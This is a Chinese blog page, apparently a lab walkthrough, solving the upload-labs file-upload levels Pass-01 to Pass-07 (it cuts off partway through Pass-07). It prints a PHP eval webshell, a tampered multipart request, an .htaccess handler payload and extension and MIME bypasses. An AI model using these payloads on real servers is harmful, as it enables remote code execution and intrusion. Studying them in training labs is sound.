@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">uploads-lab之旅</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/03/12 20:30:57</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <p>准备材料：</p>
+<ul>
+<li>phpstudy：<a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></li>
+<li>uploads-lab：<a target="_blank" rel="noopener" href="https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source&#x3D;csdn_github_accelerator</a></li>
+</ul>
+<h4 id="uploads-lab的搭建"><a href="#uploads-lab的搭建" class="headerlink" title="uploads-lab的搭建"></a>uploads-lab的搭建</h4><p>uploads-lab下载为zip文件，并解压在phpstudy下的www文件夹内，注意将文件夹重命名为uploads-lab。<br>解压成功后访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs">http://127.0.0.1/upload-labs</a> 打开即可(PS:部分人burpsuite可能使用本机地址无法抓包，建议127.0.0.1修改为本机地址！)<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673542456881-755e93e5-08db-4264-893b-3434505bba58.png" alt="image.png"></p>
+<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>任务：上传一个<code>webshell</code>到服务器。<br>首先先尝试直接传一个一句话木马<code>webshell.php</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+  eval(_POST[1]);
+?&gt;</code></pre>
+<p>上传失败，提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php<br>查看源码：</p>
+<pre class="language-php" data-language="php"><code class="language-php">function checkFile() &#123;
+    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;
+    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    &#125;
+    &#x2F;&#x2F;定义允许上传的文件类型
+    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;
+    &#x2F;&#x2F;提取上传文件的类型
+    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));
+    &#x2F;&#x2F;判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;
+        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    &#125;
+&#125;</code></pre>
+<p>f12查看源代码，发现把函数放在了前端<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673544303968-26e4e437-558e-4377-b9cb-d552fc971cc2.png" alt="image.png"></p>
+<h2 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h2><p>直接浏览器禁用js<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673545764014-6f3370b8-3730-4849-8d0e-57c5a2741143.png" alt="image.png"><br>上传成功，用antsword测试连接，成功<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546203765-a912ec10-9c39-4ed9-a479-d91042847e7f.png" alt="b4797b0734fbfd3618d946ec7938912.png"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>修改文件后缀名为<code>webshell.png</code>上传，打开burpsuite抓包：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546459582-bb57208f-a5e1-4b13-aec7-00f92787e614.png" alt="image.png"><br>将filename参数修改文件后缀<code>.php</code><br>用antsword测试连接，成功</p>
+<h2 id="方法三（重要）"><a href="#方法三（重要）" class="headerlink" title="方法三（重要）"></a>方法三（重要）</h2><p>右键页面-查看网站源代码-全部复制下来-保存为html后缀文件，找到文件中的js代码，删除。删除代码：</p>
+<pre class="language-php" data-language="php"><code class="language-php">function checkFile() &#123;
+        var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;
+        if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;
+            alert(&quot;请选择要上传的文件!&quot;);
+            return false;
+        &#125;
+        &#x2F;&#x2F;定义允许上传的文件类型
+        var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;
+        &#x2F;&#x2F;提取上传文件的类型
+        var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));
+        &#x2F;&#x2F;判断上传文件类型是否允许上传
+        if (allow_ext.indexOf(ext_name) &#x3D;&#x3D; -1) &#123;
+            var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+            alert(errMsg);
+            return false;
+        &#125;
+    &#125;</code></pre>
+<p>这时我们运行这个HTML文件，UI仍然会显示，但是由于我们已经删除了js函数，所以我们不知道要将文件传到哪里。<br>我们回到原网页，右键页面-检查-网络，上传文件，看到上传的图片的请求网址。（这一步用burpsuite也可以）<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609137323-2d967bd6-143f-41ce-b1da-dc95476ccd17.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>知道请求网址了就可以给html文件添加action了，action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609254796-cf64222b-d921-4e97-93cf-19ce4510b673.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>添加好之后重新运行html文件，再上传<code>webshell.php</code>文件，直接就可以上传成功。</p>
+<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>要求：上传一个<code>webshell</code>到服务器。</p>
+<pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+&#x2F;&#x2F;判断是否上传submit参数
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    &#x2F;&#x2F;检查文件或目录是否存在
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        &#x2F;&#x2F;允许传输 .jpg&#x2F;.png&#x2F;.gif 后缀文件
+        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;
+            &#x2F;&#x2F;将上传的文件移动到新位置
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>这一关是常见验证中的文件类型验证，也就是验证MIME信息，将<code>webshell.php</code>改为<code>webshell.png</code>，并上传，在burp抓包处修改文件名为<code>webshell.php</code>，即可上传成功，antsword连接测试成功。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673605350606-8477e614-1e6f-42f6-83e0-611ea73de702.png" alt="image.png"></p>
+<pre class="language-php" data-language="php"><code class="language-php">
+------WebKitFormBoundary09G9BBRK49OTlzSH
+Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;webshell.png&quot;&#x2F;&#x2F;将这里修改为webshell.php
+Content-Type: image&#x2F;png
+
+&lt;?php
+ @eval($_POST[1]);
+?&gt;</code></pre>
+<p>或者直接上传<code>webshell.php</code>文件，因为检测的是<code>Content-Type</code>参数，所以直接将其修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>三种之一即可。</p>
+<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+&#x2F;&#x2F;定义submit参数
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+                 $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h2><p>这次是屏蔽了所有的<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>文件，但是黑名单定义不完全是可以绕过的可以用<code>.phtml</code>、<code>.phps</code>、<code>.php5</code>、<code>.pht</code>进行绕过。比如将文件名改为<code>webshell.php5</code>上传。<br>但是要想上传后能执行，要在自己的<code>apache</code>的<code>httpd.conf</code>文件写入，在<code>D:\你安装的位置\phpstudy_pro\Extensions\Apache2.4.39\conf</code>里写入：<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code><br>这样就成功传输和使用了。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>如果这样还是不行的话，就是php版本的问题，需要将Nts版本换为ts版本：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14927087.html"><strong>https://www.cnblogs.com/Article-kelp/p/14927087.html</strong></a></p>
+<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;此文件不允许上传!&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h2><p>这下禁止上传的文件类型有很多种，我们可以尝试传一个<code>.htaccess</code>文件来把<code>.png</code>文件解析为<code>.php</code>类型</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;FilesMatch &quot;webshell.png&quot;&gt;
+SetHandler application&#x2F;x-httpd-php
+&lt;&#x2F;FilesMatch&gt;</code></pre>
+<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;此文件不允许上传&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h2><p>相比与第四关，第五关少了转换为小写的这一步骤，因此可以尝试修改为<code>.Php</code>后缀上传，连接成功。</p>
+<h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;此文件不允许上传&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h2><p>这次的代码和之前相比少了首尾去空，因此可以尝试在末尾加上空格，但是我们在本地是无法在末尾添加上空格的，所以需要在burpsuite抓包中修改上传的文件<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673682906593-0bfa79c4-182f-48d5-b349-280cda650687.png" alt="e4d6f42cc4fc3bf888b6ceb79f1001e.png"><br>这样就可以上传成功。</p>
+<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
